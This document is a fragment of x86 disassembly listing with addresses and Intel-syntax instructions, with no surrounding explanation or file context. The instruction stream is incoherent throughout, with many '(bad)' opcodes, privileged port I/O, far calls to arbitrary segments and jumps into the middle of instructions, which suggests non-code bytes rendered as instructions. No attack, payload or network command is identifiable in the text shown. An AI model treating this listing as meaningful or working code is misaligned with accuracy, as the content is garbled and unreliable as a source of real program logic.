  41deba:	inc    ebx
  41debb:	shr    edi,1
  41debd:	iret   
  41debe:	push   0x58018a
  41dec3:	add    DWORD PTR [edi-0xe],esi
  41dec6:	scas   al,BYTE PTR es:[edi]
  41dec7:	js     0x41de7a
  41dec9:	outs   dx,BYTE PTR ds:[esi]
  41deca:	dec    edx
  41decb:	lea    ebx,[ebx+ebx*8]
  41dece:	jb     0x41defb
  41ded0:	imul   ebx,edx,0x474ff648
  41ded6:	in     eax,0x9f
  41ded8:	stos   BYTE PTR es:[edi],al
  41ded9:	jae    0x41df11
  41dedb:	mov    BYTE PTR [edx],bh
  41dedd:	outs   dx,BYTE PTR ds:[esi]
  41dede:	fstp   QWORD PTR [eax-0x39492716]
  41dee4:	cmp    DWORD PTR [ebp+eiz*2-0x74],edx
  41dee8:	add    eax,0x2bc9c2fb
  41deed:	dec    esi
  41deee:	or     cl,BYTE PTR [ebx+0x76]
  41def1:	sub    DWORD PTR [eax],ebp
  41def3:	stos   BYTE PTR es:[edi],al
  41def4:	mov    esi,0xd3e48579
  41def9:	cwde   
  41defa:	imul   edx,DWORD PTR [eax+0x5b],0x6a009c3b
  41df01:	or     DWORD PTR [ecx-0x213a242c],esp
  41df07:	sbb    eax,0x69a12123
  41df0c:	sbb    edi,DWORD PTR [edi-0x2f43a29d]
  41df12:	adc    DWORD PTR [ebx],edi
  41df14:	dec    esi
  41df16:	xor    ebp,DWORD PTR [edx]
  41df18:	icebp  
  41df19:	mov    edx,0x44e6f3e
  41df1e:	fidiv  DWORD PTR [ebp+0x3f5a487c]
  41df24:	leave  
  41df25:	mov    esi,0xd4fbe86d
  41df2b:	dec    BYTE PTR [edi+eax*1-0x4e]
  41df2f:	int3   
  41df30:	xor    eax,0xf78ad463
  41df35:	xor    bl,BYTE PTR [ecx-0x51]
  41df38:	into   
  41df39:	push   0x87c95fc1
  41df3e:	jae    0x41df2c
  41df40:	xor    ebx,DWORD PTR [edi-0x53d268e3]
  41df46:	push   0x87020ffc
  41df4b:	fcmovbe st,st(1)
  41df4d:	and    BYTE PTR [ecx],bh
  41df4f:	call   0x2d97f2ee
  41df54:	mov    cl,dl
  41df56:	pop    es
  41df57:	xor    esi,edi
  41df59:	cmp    cl,BYTE PTR [edi*8+0x55bdcdf6]
  41df60:	test   DWORD PTR [eax],ecx
  41df62:	addr16 mov ebp,fs
  41df65:	jno    0x41df69
  41df67:	repz sbb al,0x90
  41df6a:	xor    eax,0xdb26d58
  41df6f:	data16 mov ah,0xcc
  41df72:	push   ebp
  41df73:	inc    ebp
  41df74:	fld    QWORD PTR [esi]
  41df76:	mov    ebx,0xf981ee54
  41df7b:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df7d:	mov    al,0xad
  41df7f:	aas    
  41df80:	push   es
  41df81:	outs   dx,BYTE PTR ds:[esi]
  41df82:	pushf  
  41df83:	push   ecx
  41df84:	sbb    al,0x9b
  41df86:	sub    BYTE PTR [ebx-0x62256845],dl
  41df8c:	and    cl,ch
  41df8e:	ret    
  41df8f:	sub    dh,dh
  41df91:	add    DWORD PTR [esp+ebx*8-0xe65f27],0xfffffffb
  41df99:	sti    
  41df9a:	jnp    0x41df81
  41df9c:	aad    0xb9
  41df9e:	adc    DWORD PTR [esi+ebp*4-0x73a0d2f1],edi
  41dfa5:	fcom   DWORD PTR [eax+0x8]
  41dfa8:	jle    0x41df70
  41dfaa:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41dfac:	and    bh,BYTE PTR [eax]
  41dfae:	jnp    0x41dfa2
  41dfb0:	push   esi
  41dfb1:	test   eax,0xd5682418
  41dfb6:	xchg   edi,eax
  41dfb7:	test   BYTE PTR [ebx+0x20f3a312],0xe
  41dfbe:	or     ebx,ebp
  41dfc0:	inc    ebp
  41dfc1:	jnp    0x41dfd9
  41dfc3:	sbb    al,0x39
  41dfc5:	fstp   QWORD PTR [ebp+0x63]
  41dfc8:	(bad)  
  41dfc9:	sbb    eax,0x9dead935
  41dfce:	addr16 loopne 0x41dfec
  41dfd1:	loop   0x41df88
  41dfd3:	iret   
  41dfd4:	dec    edx
  41dfd5:	dec    edi
  41dfd6:	sub    eax,0x7fe97770
  41dfdb:	fimul  WORD PTR [eax+0x2c]
  41dfde:	push   ss
  41dfdf:	cmp    DWORD PTR [eax-0x33],0xffffffbc
  41dfe3:	push   ebx
  41dfe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfe5:	cmp    al,0x74
  41dfe7:	xchg   ecx,esp
  41dfe9:	or     al,0xaa
  41dfeb:	aaa    
  41dfec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfed:	adc    BYTE PTR ds:0x65e5233a,0x6c
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	xchg   esp,eax
  41dff6:	xlat   BYTE PTR ds:[ebx]
  41dff7:	push   ebx
  41dff8:	shl    BYTE PTR [edx-0x4c3864d2],0x7c
  41dfff:	in     al,dx
  41e000:	mov    edx,esp
  41e002:	jge    0x41dfa3
  41e004:	inc    eax
  41e005:	aas    
  41e006:	and    eax,ecx
  41e008:	or     bl,cl
  41e00a:	xor    ecx,eax
  41e00c:	ds sbb al,0x8c
  41e00f:	ins    DWORD PTR es:[edi],dx
  41e010:	pop    eax
  41e011:	ret    0xbee0
  41e014:	xchg   DWORD PTR [edx-0x58],esi
  41e017:	pop    eax
  41e018:	mov    al,ds:0x17cbfacd
  41e01d:	xchg   esi,eax
  41e01e:	imul   edi,edi,0x4685f851
  41e024:	cs mov eax,0xbb156d1d
  41e02a:	mov    al,0xd3
  41e02c:	cdq    
  41e02d:	xor    BYTE PTR [ebp+ebp*8+0x5a],cl
  41e031:	jecxz  0x41e06d
  41e033:	cdq    
  41e034:	or     BYTE PTR [edi+0x32ee38fe],0x50
  41e03b:	addr16 pop esp
  41e03d:	or     eax,0x3f29be3d
  41e042:	pop    edi
  41e043:	cdq    
  41e044:	lds    eax,FWORD PTR [ecx+0x5e]
  41e047:	sbb    ah,BYTE PTR [esi-0x26]
  41e04a:	cmp    DWORD PTR [edi-0x2f957f0e],edi
  41e050:	loopne 0x41dfec
  41e052:	xor    dh,bl
  41e054:	cmp    al,0xec
  41e056:	mov    ah,0xcf
  41e058:	push   ebx
  41e059:	das    
  41e05a:	and    esp,DWORD PTR [ebp+0x20126416]
  41e060:	mov    al,0xff
  41e062:	fwait
  41e063:	adc    eax,0xcbf8fc11
  41e068:	rcl    BYTE PTR [eax+0x21fd93a5],1
  41e06e:	add    ah,BYTE PTR [esi]
  41e070:	cli    
  41e071:	test   eax,0xcc3057cc
  41e076:	ret    
  41e077:	xor    ebp,edi
  41e079:	pop    ss
  41e07a:	je     0x41e05f
  41e07c:	mov    edx,0x2c380004
  41e081:	sahf   
  41e082:	add    DWORD PTR [edi+0xd],ebp
  41e085:	retf   0x78fb
  41e088:	jp     0x41e079
  41e08a:	xor    ebx,edi
  41e08c:	mov    ecx,ecx
  41e08e:	outs   dx,DWORD PTR ds:[esi]
  41e08f:	call   0xafe5bc00
  41e094:	(bad)  
  41e095:	sub    ebp,DWORD PTR [esi+ecx*2]
  41e098:	pop    ebx
  41e099:	mov    ch,0x2
  41e09b:	push   ss
  41e09c:	adc    bh,BYTE PTR [eax+0x5d99bd1d]
  41e0a2:	js     0x41e046
  41e0a4:	sub    eax,0xcf5f847c
  41e0a9:	inc    esp
  41e0aa:	cmp    BYTE PTR [ecx],dh
  41e0ac:	lea    esi,[esp-0x8]
  41e0b0:	and    eax,edi
  41e0b2:	jp     0x41e06a
  41e0b4:	mov    bl,0x5a
  41e0b6:	jne    0x41e0a5
  41e0b8:	mov    esp,0x9772eef9
  41e0bd:	xlat   BYTE PTR ds:[ebx]
  41e0be:	sbb    eax,0x870928ad
  41e0c3:	xor    edi,DWORD PTR [ebx+esi*4-0x7b]
  41e0c7:	cmp    eax,0x605d456c
  41e0cc:	sti    
  41e0cd:	imul   esi,DWORD PTR [ebp-0x4],0xe48b256e
  41e0d4:	pop    ebx
  41e0d5:	mov    al,ds:0x39d46c46
  41e0da:	xor    ebx,DWORD PTR [ebp+ecx*2+0x2c]
  41e0de:	es daa 
  41e0e0:	cs lahf 
  41e0e2:	push   es
  41e0e3:	push   eax
  41e0e4:	fwait
  41e0e5:	pop    ebx
  41e0e6:	hlt    
  41e0e7:	into   
  41e0e8:	push   ds
  41e0e9:	lea    esp,[eax-0x20]
  41e0ec:	xor    eax,DWORD PTR [ecx]
  41e0ee:	lahf   
  41e0ef:	xor    al,BYTE PTR [ebp+0x7e8acc7e]
  41e0f5:	and    eax,0x79041e4c
  41e0fa:	inc    ebp
  41e0fb:	mov    ecx,0x953881ec
  41e100:	popf   
  41e101:	or     bh,al
  41e103:	cmp    eax,0xb7b9f35f
  41e108:	xlat   BYTE PTR ds:[ebx]
  41e109:	cmp    eax,0x765f3a5f
  41e10e:	jns    0x41e0e4
  41e110:	in     al,0x7a
  41e112:	loop   0x41e119
  41e114:	fdivp  st(4),st
  41e116:	call   0xddebe83f
  41e11b:	ins    BYTE PTR es:[edi],dx
  41e11c:	mov    dh,0xdc
  41e11e:	mov    ah,0x19
  41e120:	push   ds
  41e121:	push   edi
  41e122:	adc    eax,0xf482e06f
  41e127:	nop
  41e128:	add    al,ch
  41e12a:	jg     0x41e111
  41e12c:	inc    esp
  41e12d:	cmp    ah,cl
  41e12f:	jns    0x41e0e3
  41e131:	sbb    bh,BYTE PTR [ebp-0x6c]
  41e134:	mov    edi,esi
  41e136:	(bad)  
  41e137:	xor    esi,DWORD PTR [esi]
  41e139:	dec    ecx
  41e13a:	leave  
  41e13b:	jbe    0x41e176
  41e13d:	mov    edx,0xeb6e124e
  41e142:	and    eax,0xbc04e966
  41e147:	cmp    esi,edi
  41e149:	sub    al,BYTE PTR [ecx-0x1d]
  41e14c:	shl    DWORD PTR ds:0xd68d206b,0x4d
  41e153:	add    BYTE PTR [edi],dl
  41e155:	jbe    0x41e118
  41e157:	idiv   DWORD PTR [esi+esi*8]
  41e15a:	out    0xa6,al
  41e15c:	in     eax,0x15
  41e15e:	ja     0x41e1bc
  41e160:	(bad)  
  41e161:	and    dh,BYTE PTR [edx+0x174e7481]
  41e167:	ficomp DWORD PTR [ecx-0x73]
  41e16a:	inc    eax
  41e16b:	lock sbb eax,0xb979e3ab
  41e171:	outs   dx,BYTE PTR ds:[esi]
  41e172:	mov    esi,0xc6df06ee
  41e177:	add    al,0xbd
  41e179:	scas   al,BYTE PTR es:[edi]
  41e17a:	jp     0x41e1bf
  41e17c:	xor    BYTE PTR ds:0x4d76d7cc,bh
  41e182:	xchg   DWORD PTR [ecx+0x44],esp
  41e185:	je     0x41e15b
  41e187:	sub    al,BYTE PTR [ebx]
  41e189:	push   cs
  41e18a:	retf   0x661d
  41e18d:	data16 je 0x41e17e
  41e190:	aam    0xce
  41e192:	cmp    dl,BYTE PTR ds:0xf4b7a31b
  41e198:	cmp    ebx,DWORD PTR [esp+ebx*4-0x7e]
  41e19c:	call   0xcca0:0x579ed50d
  41e1a3:	push   ebp
  41e1a4:	daa    
  41e1a5:	retf   0xce03
  41e1a8:	dec    esp
  41e1a9:	cwde   
  41e1aa:	mov    cl,0x89
  41e1ac:	in     eax,dx
  41e1ad:	test   al,ah
  41e1af:	xchg   ebx,eax
  41e1b0:	xlat   BYTE PTR fs:[ebx]
  41e1b2:	jge    0x41e1e5
  41e1b4:	out    0xe0,eax
  41e1b6:	fwait
  41e1b7:	push   es
  41e1b8:	jmp    0x41e1f8
  41e1ba:	cmc    
  41e1bb:	(bad)  ds:0x44262608
  41e1c1:	push   ebx
  41e1c2:	das    
  41e1c3:	mov    ?,WORD PTR [esi-0x1fed8748]
  41e1c9:	mov    ebx,0x7278e0b1
  41e1ce:	push   cs
  41e1cf:	mov    dh,0xb9
  41e1d1:	popa   
  41e1d2:	gs push edx
  41e1d4:	int    0xe3
  41e1d6:	ins    DWORD PTR es:[edi],dx
  41e1d7:	cmp    ecx,eax
  41e1d9:	xchg   edx,eax
  41e1da:	cmp    DWORD PTR [ebx+0x7507bc3f],edx
  41e1e0:	sub    bl,bl
  41e1e2:	bswap  esp
  41e1e4:	dec    ecx
  41e1e5:	or     eax,DWORD PTR [edx-0x2916bc0a]
  41e1eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e1ec:	jmp    esi
  41e1ee:	int    0xee
  41e1f0:	push   ebx
  41e1f1:	mov    eax,ds:0xff77f426
  41e1f6:	adc    DWORD PTR [eax-0x52f075a6],0xffffffa3
  41e1fd:	xchg   BYTE PTR ds:0xeff2cc45,dh
  41e203:	push   DWORD PTR [esi-0x64]
  41e206:	xchg   BYTE PTR [edx+0x4b],ah
  41e209:	cmp    BYTE PTR [esi],ch
  41e20b:	mov    bl,BYTE PTR [ebx+0x15]
  41e20e:	(bad)  
  41e20f:	les    esp,FWORD PTR [edx]
  41e211:	xor    bl,BYTE PTR [ecx-0x5fbc9bf1]
  41e217:	and    DWORD PTR [edx],edx
  41e219:	sti    
  41e21a:	xchg   cl,dh
  41e21c:	je     0x41e20e
  41e21e:	js     0x41e1f4
  41e220:	pop    edx
  41e221:	cmc    
  41e222:	pop    ss
  41e223:	pop    esp
  41e224:	pop    eax
  41e225:	in     al,0x2c
  41e227:	loope  0x41e29a
  41e229:	push   edx
  41e22a:	sub    BYTE PTR [esi+0x77],ah
  41e22d:	arpl   WORD PTR [edx],dx
  41e22f:	sub    ebp,DWORD PTR [ecx+ebp*4+0x27]
  41e233:	std    
  41e234:	mov    edi,DWORD PTR [eax-0x6a19199f]
  41e23a:	or     BYTE PTR [esi-0x554f9d17],ch
  41e240:	push   ds
  41e241:	pop    ecx
  41e242:	pop    ss
  41e243:	push   edi
  41e244:	imul   ebp,DWORD PTR [edx],0xffffff9b
  41e247:	and    DWORD PTR ds:0xdceae3b8,ebx
  41e24d:	adc    al,BYTE PTR [ebx-0x50]
  41e250:	pop    ebp
  41e251:	mov    bl,al
  41e253:	or     ecx,DWORD PTR [edx+0x56b13c3b]
  41e259:	push   DWORD PTR [ebx+0x52]
  41e25c:	mov    ch,0x5b
  41e25e:	(bad)  
  41e25f:	jmp    0x41e1fd
  41e261:	fidivr DWORD PTR es:[edx+ecx*2]
  41e265:	dec    esp
  41e266:	je     0x41e215
  41e268:	pop    edi
  41e269:	out    dx,al
  41e26a:	push   ebp
  41e26b:	out    0xd,al
  41e26d:	mov    ebx,0x365a4866
  41e272:	idiv   esp
  41e274:	not    edx
  41e276:	test   BYTE PTR [ecx+0x60df7ea0],0xc7
  41e27d:	pop    edx
  41e27e:	rcpps  xmm5,XMMWORD PTR [ecx+eiz*1]
  41e282:	ret    
  41e283:	mov    dl,0xf2
  41e285:	sbb    BYTE PTR [eax+0x30a9384c],ah
  41e28b:	add    al,0x0
  41e28d:	in     al,dx
  41e28e:	xor    DWORD PTR [ecx-0x5e733502],esp
  41e294:	clc    
  41e295:	adc    BYTE PTR [ebx+0x6f],0xfc
  41e299:	pusha  
  41e29a:	mov    bh,0xc7
  41e29c:	enter  0x6771,0x78
  41e2a0:	mov    DWORD PTR [eax+0x77],edi
  41e2a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2a4:	inc    esp
  41e2a5:	sub    eax,0x66bc4b64
  41e2aa:	inc    esp
  41e2ab:	adc    DWORD PTR ds:0x416cc011,eax
  41e2b1:	or     ah,bl
  41e2b3:	push   ecx
  41e2b4:	jmp    0x41e270
  41e2b6:	idiv   DWORD PTR [esi+0x411499f0]
  41e2bc:	arpl   dx,ax
  41e2be:	(bad)  
  41e2c1:	popa   
  41e2c2:	daa    
  41e2c3:	pusha  
  41e2c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2c5:	pop    ebp
  41e2c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2c7:	loope  0x41e260
  41e2c9:	mov    edi,0x3ad1fcf4
  41e2ce:	stos   DWORD PTR es:[edi],eax
  41e2cf:	inc    ebx
  41e2d0:	add    eax,0x479fbbb2
  41e2d5:	mov    ds:0xb780ebe2,al
  41e2da:	pushf  
  41e2db:	in     eax,dx
  41e2dc:	cmp    BYTE PTR [eax-0x3b90f7f8],ah
  41e2e2:	enter  0x4afc,0xe8
  41e2e6:	test   BYTE PTR [edx+0xf789621],ch
  41e2ec:	in     eax,dx
  41e2ed:	mov    dl,0x1f
  41e2ef:	mov    DWORD PTR [eax+0x44],ebx
  41e2f2:	and    DWORD PTR [esp+edx*2],0x48
  41e2f6:	xchg   ebp,eax
  41e2f7:	or     eax,DWORD PTR [esi+0x79fcb992]
  41e2fd:	stc    
  41e2fe:	sahf   
  41e2ff:	jp     0x41e32a
  41e301:	jg     0x41e33f
  41e303:	addr16 js 0x41e29e
  41e306:	pusha  
  41e307:	or     DWORD PTR ds:0x5b9c6f37,esi
  41e30d:	adc    BYTE PTR [ebx+esi*2+0x20e79ba4],bh
  41e314:	or     dl,BYTE PTR [ebx+edx*8]
  41e317:	(bad)  
  41e318:	or     eax,0x556b3484
  41e31d:	add    BYTE PTR [edi-0xc],0xa5
  41e321:	push   ecx
  41e322:	cmp    BYTE PTR [ebx],dh
  41e324:	cs sbb al,0xe4
  41e327:	and    cl,BYTE PTR [ebp-0x15]
  41e32a:	hlt    
  41e32b:	xor    eax,esi
  41e32d:	test   BYTE PTR [ecx+eiz*4+0x6a],bh
  41e331:	sub    ch,BYTE PTR [ecx+0x60]
  41e334:	(bad)  
  41e335:	sbb    ebx,DWORD PTR [edi-0x3682b06a]
  41e33b:	scas   eax,DWORD PTR es:[edi]
  41e33c:	mov    edx,0x9d09c83b
  41e341:	(bad)  
  41e343:	call   0xb9ad:0xa55bddc6
  41e34a:	out    dx,eax
  41e34b:	sbb    ch,ah
  41e34d:	dec    esi
  41e34e:	pushf  
  41e34f:	xchg   esi,eax
  41e350:	push   edx
  41e351:	aas    
  41e352:	(bad)  
  41e353:	out    0x53,al
  41e355:	xchg   ebp,eax
  41e356:	add    DWORD PTR [ebx-0x4a],0x161777e5
  41e35d:	mov    esi,0x51326942
  41e362:	call   0x87f4:0x3919b8c
  41e369:	dec    edx
  41e36a:	scas   eax,DWORD PTR es:[edi]
  41e36b:	xor    al,0x85
  41e36d:	mov    eax,ds:0xcbd711cb
  41e372:	outs   dx,DWORD PTR gs:[esi]
  41e374:	lock bound edx,QWORD PTR [edi]
  41e377:	add    cl,BYTE PTR [ecx]
  41e379:	add    al,0xd1
  41e37b:	std    
  41e37c:	ins    BYTE PTR es:[edi],dx
  41e37d:	inc    edx
  41e37e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e37f:	push   0x598a77fb
  41e384:	pop    ebx
  41e385:	(bad)  
  41e386:	clc    
  41e387:	scas   eax,DWORD PTR es:[edi]
  41e388:	in     al,dx
  41e389:	and    DWORD PTR gs:[ecx],esp
  41e38c:	inc    eax
  41e38d:	sub    DWORD PTR [ecx],0xb
  41e390:	mov    DWORD PTR [ebx+edi*2-0x1a],esi
  41e394:	xor    eax,0x8fa98b85
  41e399:	mov    edx,0x5c24fdd1
  41e39e:	test   al,0xab
  41e3a1:	fwait
  41e3a2:	dec    edx
  41e3a3:	int    0xed
  41e3a5:	sbb    BYTE PTR [eax+0x3a],ah
  41e3a8:	in     al,dx
  41e3a9:	jno    0x41e41a
  41e3ab:	aas    
  41e3ac:	daa    
  41e3ad:	nop
  41e3ae:	adc    BYTE PTR [esi+0x1ba9aa06],0x42
  41e3b5:	(bad)  
  41e3b7:	jle    0x41e33a
  41e3b9:	cmp    eax,0x97c0b797
  41e3be:	or     BYTE PTR [ebx],al
  41e3c0:	loopne 0x41e427
  41e3c2:	retf   
  41e3c3:	mov    BYTE PTR [esi],dl
  41e3c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3c6:	sub    DWORD PTR [edi-0x7b26f44f],esp
  41e3cc:	mov    esp,0xc3caf8f4
  41e3d1:	mov    ebp,0x506d302f
  41e3d6:	scas   al,BYTE PTR es:[edi]
  41e3d7:	enter  0x60a2,0x15
  41e3db:	bnd jg 0x41e395
  41e3de:	loop   0x41e3c0
  41e3e0:	jo     0x41e3bf
  41e3e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3e3:	call   0xbff4553f
  41e3e8:	sub    eax,0xe57f4cea
  41e3ed:	push   edx
  41e3ee:	fild   QWORD PTR [ecx+0x1d]
  41e3f1:	push   es
  41e3f2:	cmp    eax,0xf22ec78d
  41e3f7:	cmp    BYTE PTR [ebp-0x365eb879],dh
  41e3fd:	aam    0x6
  41e3ff:	push   es
  41e400:	mov    eax,0x41eacb32
  41e405:	dec    edx
  41e406:	mov    cl,0xff
  41e408:	cmp    eax,0x95c35619
  41e40d:	test   DWORD PTR [esp+edx*2],ebx
  41e410:	jnp    0x41e41e
  41e412:	xchg   edi,eax
  41e413:	aad    0x1b
  41e415:	sub    al,0x3
  41e417:	gs mov ebx,0x8c4623f8
  41e41d:	sbb    BYTE PTR [ebx-0x6859c3ca],0x72
  41e424:	and    cl,BYTE PTR [ebp+0x667fce8e]
  41e42a:	call   0xc53e:0xd1192016
  41e431:	mov    esp,0x9543e3d7
  41e436:	loope  0x41e3ec
  41e438:	jmp    0x4b4:0x30dd47a4
  41e43f:	add    edx,DWORD PTR [esi]
  41e441:	(bad)  [ecx]
  41e443:	mov    ds:0x7f7fdb77,eax
  41e448:	adc    bl,BYTE PTR [ebx+0x66b7c812]
  41e44e:	xchg   ebp,eax
  41e44f:	aaa    
  41e450:	js     0x41e418
  41e452:	fsubrp st(1),st
  41e454:	jns    0x41e3e8
  41e456:	ins    DWORD PTR es:[edi],dx
  41e457:	cwde   
  41e458:	cmp    ah,al
  41e45a:	and    eax,0x49428903
  41e45f:	cmp    dl,ch
  41e461:	leave  
  41e462:	pop    edi
  41e463:	add    esi,0xaa0fa501
  41e469:	test   eax,0x521246ca
  41e46e:	shl    DWORD PTR [ebx-0x4],0x26
  41e472:	sub    esp,0x35
  41e475:	push   cs
  41e476:	lods   eax,DWORD PTR ds:[esi]
  41e477:	dec    edx
  41e478:	push   ss
  41e479:	loop   0x41e45a
  41e47b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e47c:	daa    
  41e47d:	push   ds
  41e47e:	fdiv   QWORD PTR [ebp-0xb]
  41e481:	cwde   
  41e482:	bound  esi,QWORD PTR [edx+0x771edb51]
  41e488:	mov    ecx,0x7f7b276a
  41e48d:	stos   DWORD PTR es:[edi],eax
  41e48e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e48f:	repnz imul ebp,ebp,0x4f
  41e493:	xor    al,0x70
  41e495:	pop    esp
  41e496:	leave  
  41e497:	shl    cl,1
  41e499:	call   esi
  41e49b:	pop    edx
  41e49c:	aas    
  41e49d:	lods   al,BYTE PTR ds:[esi]
  41e49e:	mov    cl,0x39
  41e4a0:	sbb    eax,0x595001e4
  41e4a5:	mov    al,0xc0
  41e4a7:	mov    ebx,DWORD PTR [esi-0x3d]
  41e4aa:	int3   
  41e4ab:	arpl   WORD PTR [edi],sp
  41e4ad:	inc    eax
  41e4ae:	or     BYTE PTR ds:0x46f04a28,ch
  41e4b4:	lea    ecx,[eax-0x555469d2]
  41e4ba:	daa    
  41e4bb:	mov    cl,BYTE PTR [edi+0x5d]
  41e4be:	push   ebp
  41e4bf:	xchg   BYTE PTR [ebx+eiz*2],bh
  41e4c2:	xor    BYTE PTR [edi+0x5d],bh
  41e4c5:	dec    ecx
  41e4c6:	push   esi
  41e4c7:	cmp    cl,BYTE PTR [edi+0xcd68b50]
  41e4cd:	mov    al,dh
  41e4cf:	lds    edx,FWORD PTR [eax+0x43d0eb2a]
  41e4d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e4d6:	jb     0x41e49a
  41e4d8:	mov    ds:0xdee046b5,eax
  41e4dd:	mov    dh,0xe8
  41e4df:	add    al,0x2b
  41e4e1:	xchg   DWORD PTR [edx],ebp
  41e4e3:	outs   dx,BYTE PTR ds:[esi]
  41e4e4:	xchg   esp,eax
  41e4e5:	dec    eax
  41e4e6:	loope  0x41e4ca
  41e4e8:	mov    ebp,0x290f10dd
  41e4ed:	add    eax,0x31a13d1c
  41e4f2:	mov    eax,DWORD PTR [esi]
  41e4f4:	jmp    0x41e507
  41e4f6:	sahf   
  41e4f7:	push   edi
  41e4f8:	loope  0x41e4cf
  41e4fa:	xor    eax,0xb4bde869
  41e4ff:	lahf   
  41e500:	fmul   QWORD PTR [esi-0x6b2e4b13]
  41e506:	(bad)  
  41e507:	xor    al,0x42
  41e509:	push   DWORD PTR [esi-0xf60e835]
  41e50f:	fmul   QWORD PTR [eax-0x520ec3b4]
  41e515:	pushf  
  41e516:	cs dec ebp
  41e518:	push   ss
  41e519:	xor    BYTE PTR [eax+0x5bd75868],al
  41e51f:	ss lock clc 
  41e522:	mov    DWORD PTR [eax],edx
  41e524:	ret    
  41e525:	cvttps2pi mm6,xmm7
  41e528:	pop    eax
  41e529:	jnp    0x41e555
  41e52b:	dec    ebp
  41e52c:	icebp  
  41e52d:	(bad)  
  41e52f:	test   al,0x91
  41e531:	mov    dl,0x13
  41e533:	sub    DWORD PTR es:[ebx],0x54ac3f5
  41e53a:	ja     0x41e4f2
  41e53c:	test   BYTE PTR [edx-0x2f82ae1f],bl
  41e542:	add    al,dl
  41e544:	jle    0x41e595
  41e546:	mov    al,ds:0xe3f6019
  41e54b:	ror    BYTE PTR [esi],cl
  41e54d:	lock and ebx,DWORD PTR [edi]
  41e550:	lds    eax,FWORD PTR [edi-0x70b5440c]
  41e556:	ss daa 
  41e558:	fild   QWORD PTR [eax]
  41e55a:	jp     0x41e501
  41e55c:	jnp    0x41e5a5
  41e55e:	cmp    BYTE PTR [ebx+0x4b571804],al
  41e564:	cmp    edx,DWORD PTR ds:0x4d18f2d8
  41e56a:	repnz scas al,BYTE PTR es:[edi]
  41e56c:	aam    0x4a
  41e56e:	or     cl,ah
  41e570:	push   ds
  41e571:	retf   
  41e572:	outs   dx,DWORD PTR ds:[esi]
  41e573:	fucomp st(2)
  41e575:	in     eax,0x5f
  41e577:	push   esp
  41e578:	fld    DWORD PTR [ebx]
  41e57a:	dec    esp
  41e57b:	push   0xc19fc426
  41e580:	mov    WORD PTR [ebp+ecx*1-0x7a27081c],ds
  41e587:	push   ebx
  41e588:	xchg   ecx,eax
  41e589:	cmp    al,0x46
  41e58b:	sahf   
  41e58c:	ss mov ebp,0x18d648c
  41e592:	xchg   esi,eax
  41e593:	push   ebx
  41e594:	add    edx,0x73
  41e597:	push   esi
  41e598:	out    dx,eax
  41e599:	stos   DWORD PTR es:[edi],eax
  41e59a:	in     al,dx
  41e59b:	jb     0x41e5ca
  41e59d:	pop    ebp
  41e59e:	hlt    
  41e59f:	lock icebp 
  41e5a1:	out    dx,eax
  41e5a2:	pop    edi
  41e5a3:	mov    edi,0x81e94ebd
  41e5a8:	in     eax,0x4f
  41e5aa:	cwde   
  41e5ab:	cmp    DWORD PTR [edi],ebp
  41e5ad:	xchg   ecx,eax
  41e5ae:	mov    ah,0x37
  41e5b0:	call   0x69f66ee7
  41e5b5:	sbb    al,0x45
  41e5b7:	int3   
  41e5b8:	fidiv  WORD PTR [eax+0x66257ced]
  41e5be:	dec    edx
  41e5bf:	and    BYTE PTR [edx+ebx*8-0x74],ch
  41e5c3:	or     eax,DWORD PTR [edx-0xe]
  41e5c6:	test   al,0x1b
  41e5c8:	lods   eax,DWORD PTR ds:[esi]
  41e5c9:	mov    bh,0xff
  41e5cb:	enter  0x990d,0x59
  41e5cf:	pop    es
  41e5d0:	mov    BYTE PTR [esp+ecx*8-0x11b28a99],ch
  41e5d7:	out    0x1a,al
  41e5d9:	div    BYTE PTR [ecx+0x7f318ae5]
  41e5df:	jns    0x41e63e
  41e5e1:	mov    al,0xad
  41e5e3:	repz mov cl,0xfb
  41e5e6:	pop    esp
  41e5e7:	adc    BYTE PTR [esi],0xc0
  41e5ea:	pop    ebx
  41e5eb:	inc    ebx
  41e5ec:	das    
  41e5ed:	add    ecx,DWORD PTR [esi+0x10]
  41e5f0:	int3   
  41e5f1:	ins    DWORD PTR es:[edi],dx
  41e5f2:	inc    esp
  41e5f3:	jmp    0x16ce:0x5ae670d3
  41e5fa:	and    al,0xed
  41e5fc:	or     DWORD PTR [edx],ebx
  41e5fe:	sub    BYTE PTR [eax+ebx*4+0x158501ea],bh
  41e605:	fsub   st,st(7)
  41e607:	add    DWORD PTR [esi+ecx*8+0x65379cb8],edi
  41e60e:	lods   eax,DWORD PTR ds:[esi]
  41e60f:	dec    esi
  41e610:	aaa    
  41e611:	add    eax,DWORD PTR [edx+ebp*2]
  41e614:	add    dl,0xae
  41e617:	into   
  41e618:	jp     0x41e62d
  41e61a:	mov    ds:0x6a639fd0,al
  41e61f:	jae    0x41e66a
  41e621:	sub    eax,0x11edc45f
  41e626:	inc    eax
  41e627:	and    al,0xc
  41e629:	xchg   ecx,eax
  41e62a:	jae    0x41e631
  41e62c:	xchg   edi,eax
  41e62d:	xchg   edi,eax
  41e62e:	push   cs
  41e62f:	arpl   WORD PTR [eax-0x1567b9db],bp
  41e635:	cmp    DWORD PTR [esi+ebx*2],eax
  41e638:	or     al,0x34
  41e63a:	setae  al
  41e63d:	cmp    DWORD PTR [edi-0x5bc58324],0xe3f4c111
  41e647:	popf   
  41e648:	pop    edi
  41e649:	push   esi
  41e64a:	push   cs
  41e64b:	sub    bl,cl
  41e64d:	repnz add al,0x8d
  41e650:	sub    al,BYTE PTR [edi+0x12]
  41e653:	repz add eax,0xba01f9db
